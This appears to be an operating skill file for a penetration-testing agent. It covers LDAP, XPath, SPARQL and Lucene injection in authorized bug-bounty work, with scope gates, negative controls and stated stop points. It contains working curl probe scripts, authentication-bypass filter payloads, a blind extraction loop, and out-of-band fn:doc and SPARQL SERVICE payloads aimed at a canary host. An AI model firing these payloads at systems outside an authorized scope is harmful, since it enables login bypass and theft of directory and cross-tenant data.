---
name: zp-ldap-xpath
description: ZeroProtocol hunter for injection into query languages other than SQL - LDAP search filters and DNs, XPath and XQuery, SPARQL, Lucene and Elasticsearch, and MongoDB $where. Use when a login, people-search or faceted-search feature sits on a directory or XML store, when javax.naming or a filter-syntax error appears in a response, or when a tenant clause is concatenated into a query. LDAP filters, XPath 1.0 and Lucene have no comment token (SPARQL and XQuery do), so the proof is a balanced always-true expression plus a negative control.
---

# zp-ldap-xpath - mostly no comment token, so balance it

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0 before any request.
Exit 1 refuse and name the pattern · 3 stop · 4 stop.

SQL lets you `--` the rest of the query away. **LDAP search filters, XPath 1.0 and Lucene** have no
comment token at all, so your input must leave the expression **syntactically whole** or the server
throws a parse error instead of executing. Two of the five do have one and you should use it:
SPARQL takes `#` to end of line (outside IRIs and strings) and XQuery/XPath 3.0 take `(: ... :)` -
that is the cheapest way to swallow the rest of a concatenated query on those endpoints.

Where there is no comment token, that constraint is also the detector: an **unbalanced** probe that
errors beside a **balanced always-true** probe that authenticates is the finding. Either half alone is
a guess - a 500 on a stray `)` is a parse error, not a bypass.

---

## Procedure

**1. Fingerprint the language.** Error strings decide, not the feature name.

```bash
H=target.tld
probe(){ curl -sk -o /tmp/zp.b -w '%{http_code} %{size_download} %{time_total}\n' --max-time 20 \
  -X POST "https://$H/api/login" -H 'Content-Type: application/json' --data-raw "$1"; }
probe '{"username":"zpuser","password":"wrong"}'      # BASELINE - keep this line for the report
probe '{"username":"zpuser)","password":"wrong"}'     # one unbalanced paren
grep -oiE 'javax\.naming[.A-Za-z]*|InvalidSearchFilter[A-Za-z]*|Bad search filter|ldap_search|com\.sun\.jndi[.A-Za-z]*|LDAP: error code [0-9]+|XPathException|XPTY[0-9]+|FORG[0-9]+|SaxonApiException|MalformedQueryException|QueryParsingException|parse_exception|failed to create query' /tmp/zp.b
```

| Fingerprint | Language |
|---|---|
| `javax.naming.*`, `InvalidSearchFilterException`, `Bad search filter`, `ldap_search()` | LDAP search filter |
| `LDAP: error code 49 - 80090308` | Active Directory bind - see the AD rows below |
| `XPathException`, `XPTY0004`, `FORG0001`, `SaxonApiException`, `net.sf.saxon` | XPath 1.0/2.0 or XQuery |
| `MalformedQueryException`, `org.eclipse.rdf4j`, `Virtuoso 37000` | SPARQL |
| `parse_exception`, `QueryParsingException`, `failed to create query` | Lucene / Elasticsearch |

**2. Find the asymmetry before building anything.** Send each character raw, compare to baseline.

```bash
for c in ')' '(' '*' '\' '&' '|' '!' "'" ']' '}' '"' '/' '%00'; do printf '%-6s ' "$c"
  probe "$(python3 -c 'import json,sys;print(json.dumps({"username":"zpuser"+sys.argv[1],"password":"x"}))' "$c")"; done
printf '%-6s ' 'NUL'      # the real NUL - argv cannot carry one, so let json.dumps emit the escape
probe "$(python3 -c 'import json;print(json.dumps({"username":"zpuser\u0000","password":"x"}))')"
```

The `%00` row is a **double-decode** probe, not the NUL probe: the value goes into a JSON body with
`--data-raw`, so the target receives the three literal characters `%`, `0`, `0` and nothing decodes
them. The NUL-truncation case - the one that makes a trailing LDAP clause disappear - needs the
`\u0000` line, which the target's JSON parser turns into a real NUL byte.

A safe app escapes all of them and every line matches baseline. **One character that moves the status,
the length or the error while its balanced partner does not** is the injection point.

**3. Pin the context - payloads do not transfer between these.**

| Context | Input lands in | Characters that matter |
|---|---|---|
| LDAP search filter | `(&(uid=X)(userPassword=Y))` | `* ( ) \ & \| !` and NUL |
| LDAP DN | `uid=X,ou=people,dc=corp` | `, = + " \ < > ;` - `*` is **not** a wildcard here |
| XPath predicate / XQuery FLWOR | `//user[name/text()='X']` | `' " ] [ ( ) \| and or`, plus `{ } , ;` in XQuery |
| SPARQL / Lucene `query_string` | `{ ?s :name "X" }` · `tenant:7 AND body:X` | `" } { . ; UNION SERVICE` · `: ( ) " && \|\| ! ^ ~ * ?` |

**4. Auth bypass - balanced, with the negative control in the same loop.** What must balance is the
prefix you inject: it has to **close the clauses it opened, up to the first complete filter**. What
follows - the remainder of the app's own filter - becomes trailing junk, and whether the server
accepts it is implementation-dependent. Many LDAP call sites (PHP `ldap_search`, JNDI) parse the
first complete filter and drop the rest, which is precisely why this class works.

```bash
balance(){ python3 -c 'import sys,re;s=sys.argv[1];u=re.sub(r"\\.","",s)
print(f"{s!r:46} depth={u.count(chr(40))-u.count(chr(41))}")' "$1"; }   # a diagnostic, not a pass/fail
for p in 'zpuser)(|(uid=*' '*)(uid=*))(|(uid=*' 'zpuser)(!(userPassword=zpNOSUCHVALUE))' 'zpuser*' \
         'zpuser)(|(uid=zpNOSUCHUSER'; do
  balance "$(printf '(&(uid=%s)(userPassword=wrong))' "$p")"
  printf '  -> '; probe "$(python3 -c 'import json,sys;print(json.dumps({"username":sys.argv[1],"password":"wrong"}))' "$p")"
done
```

**Do not "fix" these payloads to reach depth 0.** Run `balance` and you get `+1`, `0`, `-1`, `0`,
`+1` across those five against that template - three of the five would be condemned by a depth-0
rule, and adding or dropping a trailing `)` destroys them. Depth 0 is not sufficient either: the
one depth-0 bypass yields `(&(uid=*)(uid=*))(|(uid=*)(userPassword=wrong))`, two concatenated
top-level filters rather than one valid filter. Use the depth only to see *what shape* you handed
the server. A parse error on the trailing remainder is itself a fingerprint - a strict parser - and
the answer to it is NUL truncation (step 2) or the absolute-filter forms `(&)` / `(|)`, not a
reshuffled paren.

The last payload is the **negative control** - identically shaped, logically false, and it must fail.
If true-shaped and false-shaped both "succeed", the endpoint is broken, not injectable.

**5. Build a two-sided oracle, then extract only what proves it.** One-sided length diffing is the main
false positive - banners, CSRF tokens and your own injected character all move `size_download`. Re-read
the FALSE control between rounds; a WAF that starts blocking looks exactly like a permanent TRUE.

```bash
oracle(){ curl -sk -o /dev/null -w '%{http_code}:%{size_download}' --max-time 20 \
  -X POST "https://$H/api/directory/search" -H 'Content-Type: application/json' \
  --data-raw "$(python3 -c 'import json,sys;print(json.dumps({"q":sys.argv[1]}))' "$1")"; }
T=$(oracle 'zpuser)(objectClass=*))(&(objectClass=zpVOID')
F=$(oracle 'zpuser)(objectClass=zpVOID))(&(objectClass=zpVOID'); echo "TRUE $T / FALSE $F"
[ "$T" = "$F" ] && echo "no oracle here - try status code, a body marker, or another endpoint"
for a in uid cn mail memberOf description sAMAccountName userPassword; do          # attribute reach
  printf '%-18s %s\n' "$a" "$(oracle "zpuser)($a=*))(&(objectClass=zpVOID")"; done
PRE=""; for pos in 1 2 3 4; do                      # four characters of YOUR OWN record, then stop
  for c in {a..z} {0..9} '$' '.' '{' '}'; do
    [ "$(oracle "zpOWNACCOUNT)(description=$PRE$c*))(&(objectClass=zpVOID")" = "$T" ] \
      && { PRE="$PRE$c"; echo "[$pos] $PRE"; break; }
  done; done
```

Four characters that reproduce three times is a proven oracle. A full dump is a data breach you
performed - the extra characters buy no severity and lose you the report.

**6. Adjudicate the grammar off-target** - the cheapest way to show the inferred filter is right.

```bash
ldapsearch -x -H ldap://$OWN_LDAP -D "cn=zp,dc=lab,dc=local" -w "$PW" -b "dc=lab,dc=local" \
  '(&(uid=zpuser)(|(uid=*)))' uid cn            # a lab directory you own, never the target
xmllint --xpath "//user[name='admin' or '1'='1']" local.xml      # or python3 -c 'from lxml import etree'
```

`xmllint` and `lxml` are the **same engine** - both are libxml2 - so both give you complete XPath 1.0
and no XPath 2.0; an error from either on a 1.0 expression means your brackets really are unbalanced.
Stdlib `xml.etree` is a small subset that rejects `and`/`or` predicates and `text()` comparisons
outright, so the step-4 payloads cannot be adjudicated there at all. To arbitrate XPath 2.0 / XQuery
locally - `fn:doc`, FLWOR - you need Saxon-HE, BaseX or eXist.

**7. Out-of-band, where the language offers it.** LDAP filters have **no** outbound primitive - do not
promise one. An OOB hit is decisive for an otherwise blind case.

| Language | Primitive | Reading |
|---|---|---|
| XQuery / XPath 2.0 | `fn:doc("http://zp91234.canary.example/x")` | server-side fetch - this is SSRF, route to `zp-ssrf` |
| SPARQL | `} UNION { SERVICE <http://zp91234.canary.example/> { ?s ?p ?o } } #` | federated egress - `zp-ssrf` |

**8. Stop point for this class - state it in the report.** You stop at a session on an account you own,
a two-sided oracle demonstrated over four characters, or a canary hit. You do **not** dump the
directory, read another employee's record, run XQuery Update or SPARQL `INSERT DATA`/`DELETE WHERE`,
feed enumerated usernames into a spray, or busy-wait in `$where` - that is a DoS on the database.

---

## Probes and payloads

| Payload | Context | Positive looks like |
|---|---|---|
| `zpuser)` | any LDAP filter | parse error or 500 **while** the balanced twin behaves normally |
| `zpuser)(\|(uid=*`, `*)(uid=*))(\|(uid=*` | AND filter - close, then OR-true | the first directory entry returned, often a service account |
| `zpuser)(!(userPassword=zpNOSUCHVALUE))` | AND NOT a value never set | always-true with no `*`, survives naive wildcard filtering |
| `zpuser' or 'a'='a`, `' or ''='`, `x'] \| //user/* \| //user[name()='x` | XPath predicate, quoting balanced | record returned without a password, or nodes from outside the predicate |
| `") OR tenant:* OR ("`, `_exists_:apiKey`, `*:*` | Lucene / ES `query_string` | another tenant's documents, or a hidden field |
| `" } UNION { ?s ?p ?o } #` | SPARQL graph pattern | triples from outside the intended graph |

Optional: `nuclei -u "https://$H" -tags ldap,xpath -rate-limit "$(zp-scope show --json | jq -r '.rate_limit_rps // 5')"`,
and `zp-proxy` to replay the app's real request instead of a hand-built one. Neither is required -
steps 2 and 4 are the technique, and a substring-matching scanner produces the first row below.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| balanced always-true payload yields a **usable session** (the cookie works on a post-login resource) **and** the unbalanced twin returns a parse error | **confirmed auth bypass.** Critical if the entry reached is privileged |
| a lone `)` gives 500 and nothing else ever changes | parse error only. **Killed** - your logic never executed |
| a scanner said "LDAP injection" and you have no matched pair of your own | unverified, and often a third party's cluster. Killed until you reproduce it by hand inside scope |
| an identically-shaped **false** control also succeeds | not injection - a broken auth endpoint. File that, do not call it LDAP |
| two-sided oracle flips on demand, FALSE control still reads FALSE each round, positives reproduce 3x | **confirmed blind injection.** Medium alone, High once a sensitive attribute is reachable |
| `userPassword` `{SSHA}`/`{CRYPT}` readable on OpenLDAP or 389-DS | **confirmed credential exposure.** High. Prove the read; never harvest the set |
| the same claim against **Active Directory** | **impossible.** `unicodePwd` is write-only and no search returns it. Claiming it closes the report |
| input arrives escaped (`\2a`, `\28`), or filters come from an SDK (`Filter.createEqualityFilter`, parameterised `ldap3`) | correctly built. Killed |
| XPath `' or '1'='1` "works" on an unauthenticated, unscoped search box | usually **killed** - you widened a public search; a finding needs a crossed trust boundary |
| Lucene `*:*` or a broken-out clause returns another tenant's documents | **confirmed** cross-tenant read. High - the modern high-value case here |
| `fn:doc()` or SPARQL `SERVICE` reaches your canary | confirmed SSRF, which outranks the injection. File under `zp-ssrf` |

**Balanced-but-false is the commonest self-deception here** - ship the negative control line beside the
positive. And an always-true filter returns the *first* matching entry, often a service account with
nothing interesting; check what you became before writing "admin takeover".

---

## High-value patterns

- **Corporate SSO or intranet login on a directory backend** - legacy Java/Spring/PHP, concatenated
  filter, and a bypass puts you inside the perimeter. The Critical case in this class.
- **"Find a colleague", org chart, address book, `/api/directory/search`** - a filter parameter never
  meant to be user-writable, usually with no rate limit on it.
- **A faceted search where the tenant or ACL clause is concatenated into `query_string`** - one
  `) OR (` reads another customer's documents. Far more common in 2026 than LDAP.
- **Elasticsearch `_search` proxied by the app** with the user's `q` pasted in - `_exists_:<field>`
  then enumerates fields the UI hides. Pair with `zp-api`.
- **AD `description` and `info`** - administrators still stash passwords there, so a read is a direct
  credential leak with nothing to crack. It is the AD win, since no hash is ever readable.
- **A SPARQL endpoint behind a "knowledge graph" feature** - `SERVICE` is an egress primitive almost
  nobody looks for. And the **password field**, concatenated by the same code and tested far less.

---

## Pitfalls

- **Claiming AD password-hash extraction.** `unicodePwd` is never returned by a search, and this one
  error marks you as someone who has not tested a directory.
- **Reporting a parse error as a bypass**, or skipping the negative control. **Mixing up search-filter
  and DN context** - `*` is a wildcard in a filter and a literal in a DN.
- **Reaching for a comment token where there is none** - LDAP filters, XPath 1.0 and Lucene. But do
  reach for it on SPARQL (`#`) and XQuery (`(: :)`); the payload table uses both.
- **Letting the HTTP client re-encode the payload.** Use `--data-raw` / `--data-binary`;
  `--data-urlencode` double-encodes the `%00` and `%5c` probes that test escape handling.
- **Enumerating a directory and then spraying the usernames.** Credential guessing is out of scope in
  every program ZeroProtocol will touch, and it is the line between a report and an incident.
- **Extracting more than the oracle needs**, or running a blind loop at full speed - honour the
  program rate limit; this oracle is thousands of requests if you let it be.
- **A busy-wait `$where`**, or an XQuery Update / SPARQL `INSERT DATA` "just to confirm" - writes and
  stalls on a production store are damage, not proof.
- **Not naming the sink.** "The filter is concatenated at the `uid` clause; an SDK escape is the fix"
  is what gets the report accepted and the bug closed.

---

## Hand off to

New host or directory discovered -> `zp-scope` before touching it. Confirmed bypass -> `zp-triage`
then `zp-report`. A session obtained -> `zp-authz` and `zp-idor` for what it reaches, `zp-jwt-oauth`
if the directory backs SSO. `fn:doc()` / SPARQL `SERVICE` egress -> `zp-ssrf`; XML documents and
entities -> `zp-xxe-lfi`; `$where` and operator injection -> `zp-sqli`; expression evaluation ->
`zp-rce-ssti`. Endpoints not yet found -> `zp-content-discovery`; filter-building code in bundles ->
`zp-js-secrets`; source in hand -> `zp-code-audit`. Cross-tenant reads through a search proxy ->
`zp-api`, or `zp-graphql` if the resolver is GraphQL. Enumeration results -> `zp-info-disclosure`;
identity-estate follow-up under an explicit red-team engagement -> `zp-redteam-ad` or
`zp-redteam-entra`. Prior art -> `zp-intel`; replaying the app's real request -> `zp-proxy`.
